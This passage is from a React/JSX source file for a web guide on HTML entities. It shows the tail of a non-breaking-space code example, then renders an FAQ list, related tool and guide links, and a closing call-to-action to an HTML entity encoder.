<span>100&nbsp;km/h</span>       <!-- unit won't separate from number -->
<td>No&nbsp;data</td>            <!-- prevent "No" and "data" from splitting across lines -->

<!-- 2. Keep an empty table cell from collapsing (legacy HTML) -->
<td>&nbsp;</td>
<!-- Modern alternative: CSS empty-cells or min-height -->`}</code>

      {/* ---- Section 15: FAQ ---- */}
      <h2 style={sectionHeadStyle}>Frequently Asked Questions</h2>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 0 }}>
        {faqItems.map((item, i) => (
          <div
            key={i}
            style={{
              borderBottom: i < faqItems.length - 1 ? '1px solid #e2e8f0' : 'none',
              paddingTop: 20,
              paddingBottom: 20,
            }}
          >
            <h3 style={{ fontSize: 17, fontWeight: 700, marginTop: 0, marginBottom: 10, color: '#1e293b' }}>
              {item.q}
            </h3>
            <p style={{ fontSize: 14, marginBottom: 0, color: '#374151', lineHeight: 1.8 }}>
              {item.a}
            </p>
          </div>
        ))}
      </div>

      {/* ---- Related Tools ---- */}
      <div style={{
        background: '#f0f9ff',
        borderRadius: 10,
        padding: '20px 24px',
        marginTop: 48,
        marginBottom: 16,
      }}>
        <p style={{ fontWeight: 700, fontSize: 16, marginBottom: 14, marginTop: 0 }}>Related Tools</p>
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 10 }}>
          {[
            { href: `/${l}/tools/html-entity`, label: 'HTML Entity Encoder/Decoder' },
            { href: `/${l}/tools/url-encoder`, label: 'URL Encoder/Decoder' },
            { href: `/${l}/tools/html-formatter`, label: 'HTML Formatter / Beautifier' },
            { href: `/${l}/tools/escape-unescape`, label: 'String Escape / Unescape' },
          ].map(({ href, label }) => (
            <Link
              key={href}
              href={href}
              style={{
                display: 'inline-block',
                background: '#fff',
                border: '1px solid #bae6fd',
                borderRadius: 6,
                padding: '7px 14px',
                color: '#0369a1',
                fontWeight: 600,
                fontSize: 14,
                textDecoration: 'none',
              }}
            >
              {label}
            </Link>
          ))}
        </div>
      </div>

      {/* ---- Related Guides ---- */}
      <div style={{
        background: '#f8fafc',
        borderRadius: 10,
        padding: '20px 24px',
        marginBottom: 40,
      }}>
        <p style={{ fontWeight: 700, fontSize: 16, marginBottom: 14, marginTop: 0 }}>Related Guides</p>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
          {[
            { href: `/${l}/blog/url-encoder-online-guide`, label: 'URL Encoding Guide: percent-encoding, encodeURIComponent, and query strings' },
            { href: `/${l}/blog/base64-online-guide`, label: 'Base64 Encoding Guide: data URIs, binary data, and cross-language examples' },
            { href: `/${l}/blog/html-special-characters-entities-list`, label: 'HTML Special Characters and Entities Complete List' },
          ].map(({ href, label }) => (
            <Link
              key={href}
              href={href}
              style={{ color: '#2563eb', fontSize: 14, fontWeight: 500 }}
            >
              &rarr; {label}
            </Link>
          ))}
        </div>
      </div>

      {/* ---- Final CTA ---- */}
      <div style={{
        background: 'linear-gradient(135deg, #1e40af 0%, #0369a1 100%)',
        borderRadius: 12,
        padding: '24px 28px',
        textAlign: 'center',
        marginBottom: 16,
      }}>
        <p style={{ color: '#fff', fontWeight: 800, fontSize: 20, marginTop: 0, marginBottom: 8 }}>
          Try the HTML Entity Encoder/Decoder
        </p>
        <p style={{ color: '#bae6fd', fontSize: 14, marginBottom: 16, marginTop: 0 }}>
          Encode and decode HTML entities instantly. Supports named entities, decimal, and hexadecimal numeric entities.
        </p>
        <Link
          href={toolLink}
          style={{
            display: 'inline-block',
            background: '#fff',
            color: '#1e40af',
            fontWeight: 700,
            fontSize: 15,
            padding: '10px 24px',
            borderRadius: 8,
            textDecoration: 'none',
          }}
        >
          Open HTML Entity Tool &rarr;
        </Link>
      </div>
    </article>
  );
}
